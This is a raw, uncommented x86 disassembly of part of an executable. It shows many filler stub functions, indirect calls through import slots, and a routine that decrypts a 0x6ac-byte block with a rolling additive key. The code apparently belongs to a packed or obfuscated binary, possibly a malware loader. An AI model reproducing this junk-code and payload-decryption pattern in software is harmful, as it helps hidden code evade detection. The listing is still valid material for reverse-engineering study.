  4d10bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10c5:	sub    esp,0x34
  4d10c8:	lea    edx,[ebx+0x17c]
  4d10ce:	sub    esi,DWORD PTR [ebp-0xc]
  4d10d1:	push   edx
  4d10d2:	push   0x0
  4d10d4:	call   0x4d0870
  4d10d9:	add    esp,0x4
  4d10dc:	pop    edx
  4d10dd:	push   edx
  4d10de:	push   DWORD PTR [edx+0x50]
  4d10e1:	push   DWORD PTR [edx+0x50]
  4d10e4:	call   0x4d0fb8
  4d10e9:	add    esp,0x8
  4d10ec:	pop    edx
  4d10ed:	push   edx
  4d10ee:	mov    edi,0x0
  4d10f3:	push   edi
  4d10f4:	call   0x4d0870
  4d10f9:	add    esp,0x4
  4d10fc:	pop    edx
  4d10fd:	add    esp,0x34
  4d1100:	pop    ebp
  4d1101:	ret    
  4d1102:	add    BYTE PTR [eax],al
  4d1104:	mov    edi,edi
  4d1106:	push   ebp
  4d1107:	mov    ebp,esp
  4d1109:	sub    esp,0x34
  4d110c:	lea    ecx,ds:0x4d3180
  4d1112:	and    edx,DWORD PTR [ecx+0x48]
  4d1115:	push   ecx
  4d1116:	push   DWORD PTR [ecx+0xa0]
  4d111c:	push   edx
  4d111d:	push   ebx
  4d111e:	push   DWORD PTR [ecx+0x1c0]
  4d1124:	call   0x4d1254
  4d1129:	add    esp,0x10
  4d112c:	pop    ecx
  4d112d:	push   ecx
  4d112e:	mov    ecx,0x0
  4d1133:	push   ecx
  4d1134:	call   0x4d0870
  4d1139:	add    esp,0x4
  4d113c:	pop    ecx
  4d113d:	push   ecx
  4d113e:	mov    esi,0x0
  4d1143:	push   esi
  4d1144:	call   0x4d0870
  4d1149:	add    esp,0x4
  4d114c:	pop    ecx
  4d114d:	add    esp,0x34
  4d1150:	pop    ebp
  4d1151:	ret    
  4d1152:	add    BYTE PTR [eax],al
  4d1154:	mov    edi,edi
  4d1156:	push   ebp
  4d1157:	mov    ebp,esp
  4d1159:	sub    esp,0x20
  4d115c:	lea    esi,ds:0x4d310c
  4d1162:	xor    ebx,eax
  4d1164:	mov    eax,0xfffffff4
  4d1169:	push   eax
  4d116a:	call   0x4d0b6c
  4d116f:	add    esp,0x4
  4d1172:	push   esi
  4d1173:	push   ebx
  4d1174:	push   DWORD PTR [esi+0x6c]
  4d1177:	call   0x4d1194
  4d117c:	add    esp,0x8
  4d117f:	pop    esi
  4d1180:	mov    ecx,0x0
  4d1185:	push   ecx
  4d1186:	call   0x4d1530
  4d118b:	add    esp,0x4
  4d118e:	add    esp,0x20
  4d1191:	pop    ebp
  4d1192:	ret    
  4d1193:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1199:	sub    esp,0x60
  4d119c:	mov    ebx,0x4d314c
  4d11a1:	add    ecx,DWORD PTR [ebp-0x28]
  4d11a4:	push   ebx
  4d11a5:	push   eax
  4d11a6:	push   eax
  4d11a7:	call   0x4d1308
  4d11ac:	add    esp,0x8
  4d11af:	pop    ebx
  4d11b0:	push   0x0
  4d11b2:	call   0x4d0d1c
  4d11b7:	add    esp,0x4
  4d11ba:	push   0x0
  4d11bc:	call   0x4d1000
  4d11c1:	add    esp,0x4
  4d11c4:	add    esp,0x60
  4d11c7:	pop    ebp
  4d11c8:	ret    
  4d11c9:	add    BYTE PTR [eax],al
  4d11cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11d1:	sub    esp,0x28
  4d11d4:	lea    ecx,ds:0x4d3058
  4d11da:	add    edx,edi
  4d11dc:	push   ecx
  4d11dd:	push   DWORD PTR [ecx+0x8]
  4d11e0:	push   eax
  4d11e1:	call   0x4d14a4
  4d11e6:	add    esp,0x8
  4d11e9:	pop    ecx
  4d11ea:	push   ecx
  4d11eb:	push   0x0
  4d11ed:	call   0x4d1000
  4d11f2:	add    esp,0x4
  4d11f5:	pop    ecx
  4d11f6:	push   ecx
  4d11f7:	call   0x4d1024
  4d11fc:	add    esp,0x4
  4d11ff:	pop    ecx
  4d1200:	add    esp,0x28
  4d1203:	pop    ebp
  4d1204:	ret    
  4d1205:	add    BYTE PTR [eax],al
  4d1207:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d120d:	sub    esp,0x58
  4d1210:	lea    edi,ds:0x4d30cc
  4d1216:	sbb    DWORD PTR [ebp-0x18],0x68
  4d121a:	push   edi
  4d121b:	push   edx
  4d121c:	push   ebx
  4d121d:	push   eax
  4d121e:	call   0x4d14ec
  4d1223:	add    esp,0xc
  4d1226:	pop    edi
  4d1227:	push   edi
  4d1228:	mov    edi,0x0
  4d122d:	push   edi
  4d122e:	call   0x4d12f0
  4d1233:	add    esp,0x4
  4d1236:	pop    edi
  4d1237:	push   edi
  4d1238:	push   0xfffffff4
  4d123a:	call   0x4d0b6c
  4d123f:	add    esp,0x4
  4d1242:	pop    edi
  4d1243:	add    esp,0x58
  4d1246:	pop    ebp
  4d1247:	ret    
  4d1248:	pop    edi
  4d1249:	call   DWORD PTR ds:0x4d2028
  4d124f:	call   edi
  4d1251:	add    BYTE PTR [eax],al
  4d1253:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1259:	sub    esp,0x38
  4d125c:	mov    DWORD PTR [ecx-0x94],ebx
  4d1262:	lea    edx,[ecx-0x78]
  4d1265:	push   edx
  4d1266:	mov    esi,0x6ac
  4d126b:	push   esi
  4d126c:	mov    ecx,0x6ac
  4d1271:	push   ecx
  4d1272:	push   0x40001
  4d1277:	mov    edi,0x8629857a
  4d127c:	push   DWORD PTR [edi+0x7a239a86]
  4d1282:	sub    DWORD PTR [esp],0x2
  4d1286:	mov    edi,0x4d200c
  4d128b:	pop    DWORD PTR [edi]
  4d128d:	call   0x4d0dd4
  4d1292:	add    esp,0x4
  4d1295:	xchg   DWORD PTR [esp],eax
  4d1298:	mov    edx,eax
  4d129a:	pop    DWORD PTR [edx-0x80]
  4d12a0:	mov    ebx,DWORD PTR [edx-0x80]
  4d12a6:	mov    esi,ebx
  4d12a8:	sub    edi,edi
  4d12aa:	dec    edi
  4d12ab:	and    edi,0x4d0014
  4d12b1:	mov    ecx,0xd5d9a824
  4d12b6:	push   0x6ac
  4d12bb:	pop    eax
  4d12bc:	xor    ebx,ebx
  4d12be:	push   DWORD PTR [edi+ebx*1]
  4d12c1:	add    DWORD PTR [esp],ecx
  4d12c4:	pop    DWORD PTR [esi+ebx*2]
  4d12c7:	dec    DWORD PTR [esi]
  4d12c9:	xor    ecx,ecx
  4d12cb:	add    ecx,DWORD PTR [edi]
  4d12cd:	add    edi,0x4
  4d12d0:	add    esi,0x4
  4d12d3:	sub    eax,0x4
  4d12d6:	test   eax,eax
  4d12d8:	jne    0x4d12bc
  4d12da:	push   edx
  4d12db:	mov    esi,0x0
  4d12e0:	push   esi
  4d12e1:	call   0x4d0870
  4d12e6:	add    esp,0x4
  4d12e9:	pop    edx
  4d12ea:	add    esp,0x38
  4d12ed:	pop    ebp
  4d12ee:	ret    
  4d12ef:	add    BYTE PTR [edi-0x1],bl
  4d12f2:	adc    eax,0x4d2014
  4d12f7:	call   edi
  4d12f9:	add    BYTE PTR [eax],al
  4d12fb:	add    BYTE PTR [edi-0x1],bl
  4d12fe:	adc    eax,0x4d2000
  4d1303:	call   edi
  4d1305:	add    BYTE PTR [eax],al
  4d1307:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d130d:	sub    esp,0x44
  4d1310:	lea    eax,ds:0x4d3010
  4d1316:	xor    DWORD PTR [eax+0xfc],0xffffd21d
  4d1320:	push   eax
  4d1321:	mov    edx,0x0
  4d1326:	push   edx
  4d1327:	call   0x4d0870
  4d132c:	add    esp,0x4
  4d132f:	pop    eax
  4d1330:	push   eax
  4d1331:	push   DWORD PTR [eax+0x104]
  4d1337:	push   DWORD PTR [eax+0xc0]
  4d133d:	call   0x4d07b8
  4d1342:	add    esp,0x8
  4d1345:	pop    eax
  4d1346:	push   eax
  4d1347:	mov    esi,0xfffffff4
  4d134c:	push   esi
  4d134d:	call   0x4d0b6c
  4d1352:	add    esp,0x4
  4d1355:	pop    eax
  4d1356:	add    esp,0x44
  4d1359:	pop    ebp
  4d135a:	ret    
  4d135b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1361:	sub    esp,0x30
  4d1364:	lea    ebx,ds:0x4d3190
  4d136a:	sbb    ecx,DWORD PTR [ebx-0x50]
  4d136d:	push   ebx
  4d136e:	push   esi
  4d136f:	push   DWORD PTR [ebx+0x1e0]
  4d1375:	call   0x4d0b10
  4d137a:	add    esp,0x8
  4d137d:	pop    ebx
  4d137e:	push   0x0
  4d1380:	call   0x4d0870
  4d1385:	add    esp,0x4
  4d1388:	mov    edx,0x0
  4d138d:	push   edx
  4d138e:	call   0x4d15a0
  4d1393:	add    esp,0x4
  4d1396:	add    esp,0x30
  4d1399:	pop    ebp
  4d139a:	ret    
  4d139b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13a1:	sub    esp,0x4c
  4d13a4:	lea    edi,[ecx]
  4d13a6:	sbb    ebx,0x5b
  4d13a9:	push   edi
  4d13aa:	push   esi
  4d13ab:	push   DWORD PTR [edi+0x8]
  4d13ae:	push   DWORD PTR [edi+0x94]
  4d13b4:	call   0x4d0acc
  4d13b9:	add    esp,0xc
  4d13bc:	pop    edi
  4d13bd:	push   edi
  4d13be:	lea    esi,[edi-0x90]
  4d13c4:	push   esi
  4d13c5:	call   0x4d0858
  4d13ca:	add    esp,0x4
  4d13cd:	test   eax,eax
  4d13cf:	jne    0x4d13be
  4d13d1:	pop    edi
  4d13d2:	push   edi
  4d13d3:	push   0x0
  4d13d5:	call   0x4d1498
  4d13da:	add    esp,0x4
  4d13dd:	pop    edi
  4d13de:	add    esp,0x4c
  4d13e1:	pop    ebp
  4d13e2:	ret    
  4d13e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13e9:	sub    esp,0x2c
  4d13ec:	lea    eax,ds:0x4d3010
  4d13f2:	add    DWORD PTR [ebp-0x18],0x43aa
  4d13f9:	push   eax
  4d13fa:	push   0x0
  4d13fc:	call   0x4d15a0
  4d1401:	add    esp,0x4
  4d1404:	pop    eax
  4d1405:	push   eax
  4d1406:	push   DWORD PTR [eax+0x1f4]
  4d140c:	push   edi
  4d140d:	push   DWORD PTR [eax+0x4c]
  4d1410:	push   edi
  4d1411:	call   0x4d1208
  4d1416:	add    esp,0x10
  4d1419:	pop    eax
  4d141a:	push   eax
  4d141b:	push   0x0
  4d141d:	call   0x4d1530
  4d1422:	add    esp,0x4
  4d1425:	pop    eax
  4d1426:	add    esp,0x2c
  4d1429:	pop    ebp
  4d142a:	ret    
  4d142b:	add    BYTE PTR [edi-0x1],bl
  4d142e:	adc    eax,0x4d2078
  4d1433:	call   edi
  4d1435:	add    BYTE PTR [eax],al
  4d1437:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d143d:	sub    esp,0x24
  4d1440:	lea    edx,ds:0x4d3184
  4d1446:	cmp    edx,0x30cf
  4d144c:	je     0x4d143b
  4d144e:	push   edx
  4d144f:	push   DWORD PTR [edx+0x150]
  4d1455:	push   edi
  4d1456:	push   ecx
  4d1457:	call   0x4d0928
  4d145c:	add    esp,0xc
  4d145f:	pop    edx
  4d1460:	push   edx
  4d1461:	mov    esi,0x0
  4d1466:	push   esi
  4d1467:	call   0x4d153c
  4d146c:	add    esp,0x4
  4d146f:	pop    edx
  4d1470:	push   edx
  4d1471:	lea    esi,[edx-0x184]
  4d1477:	push   esi
  4d1478:	call   0x4d0858
  4d147d:	add    esp,0x4
  4d1480:	test   eax,eax
  4d1482:	jne    0x4d1471
  4d1484:	pop    edx
  4d1485:	add    esp,0x24
  4d1488:	pop    ebp
  4d1489:	ret    
  4d148a:	add    BYTE PTR [eax],al
  4d148c:	pop    edi
  4d148d:	call   DWORD PTR ds:0x4d2060
  4d1493:	call   edi
  4d1495:	add    BYTE PTR [eax],al
  4d1497:	add    BYTE PTR [edi-0x1],bl
  4d149a:	adc    eax,0x4d204c
  4d149f:	call   edi
  4d14a1:	add    BYTE PTR [eax],al
  4d14a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a9:	sub    esp,0x40
  4d14ac:	lea    eax,[ecx+0x7c]
  4d14af:	mov    DWORD PTR [ebp-0x34],0x46d
  4d14b6:	push   eax
  4d14b7:	push   DWORD PTR [eax+0xd0]
  4d14bd:	push   DWORD PTR [eax+0x138]
  4d14c3:	push   edi
  4d14c4:	call   0x4d0c00
  4d14c9:	add    esp,0xc
  4d14cc:	pop    eax
  4d14cd:	push   eax
  4d14ce:	push   0x0
  4d14d0:	call   0x4d1018
  4d14d5:	add    esp,0x4
  4d14d8:	pop    eax
  4d14d9:	push   eax
  4d14da:	push   0x0
  4d14dc:	call   0x4d1000
  4d14e1:	add    esp,0x4
  4d14e4:	pop    eax
  4d14e5:	add    esp,0x40
  4d14e8:	pop    ebp
  4d14e9:	ret    
  4d14ea:	add    BYTE PTR [eax],al
  4d14ec:	mov    edi,edi
  4d14ee:	push   ebp
  4d14ef:	mov    ebp,esp
  4d14f1:	sub    esp,0x60
  4d14f4:	mov    ecx,0x4d31cc
  4d14f9:	and    DWORD PTR [ecx-0xe4],0x2c
  4d1500:	push   ecx
  4d1501:	push   DWORD PTR [ecx+0x1cc]
  4d1507:	push   DWORD PTR [ecx+0x94]
  4d150d:	call   0x4d0a74
  4d1512:	add    esp,0x8
  4d1515:	pop    ecx
  4d1516:	push   ecx
  4d1517:	call   0x4d1248
  4d151c:	add    esp,0x4
  4d151f:	pop    ecx
  4d1520:	push   ecx
  4d1521:	call   0x4d10b4
  4d1526:	add    esp,0x4
  4d1529:	pop    ecx
  4d152a:	add    esp,0x60
  4d152d:	pop    ebp
  4d152e:	ret    
  4d152f:	add    BYTE PTR [edi-0x1],bl
  4d1532:	adc    eax,0x4d2074
  4d1537:	call   edi
  4d1539:	add    BYTE PTR [eax],al
  4d153b:	add    BYTE PTR [edi-0x1],bl
  4d153e:	adc    eax,0x4d202c
  4d1543:	call   edi
  4d1545:	add    BYTE PTR [eax],al
  4d1547:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d154d:	sub    esp,0x50
  4d1550:	lea    edi,[esi-0x74]
  4d1553:	add    DWORD PTR [ebp-0x30],esi
  4d1556:	push   edi
  4d1557:	push   DWORD PTR [edi+0x38]
  4d155a:	push   DWORD PTR [edi+0x78]
  4d155d:	call   0x4d07fc
  4d1562:	add    esp,0x8
  4d1565:	pop    edi
  4d1566:	push   edi
  4d1567:	push   0x0
  4d1569:	call   0x4d0d1c
  4d156e:	add    esp,0x4
  4d1571:	pop    edi
  4d1572:	push   edi
  4d1573:	mov    edi,0x0
  4d1578:	push   edi
  4d1579:	call   0x4d153c
  4d157e:	add    esp,0x4
  4d1581:	pop    edi
  4d1582:	add    esp,0x50
  4d1585:	pop    ebp
  4d1586:	ret    
  4d1587:	add    BYTE PTR [edi-0x1],bl
  4d158a:	adc    eax,0x4d2054
  4d158f:	call   edi
  4d1591:	add    BYTE PTR [eax],al
  4d1593:	add    BYTE PTR [edi-0x1],bl
  4d1596:	adc    eax,0x4d2068
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
  4d159f:	add    BYTE PTR [edi-0x1],bl
  4d15a2:	adc    eax,0x4d2020
  4d15a7:	call   edi
  4d15a9:	add    BYTE PTR [eax],al
	...
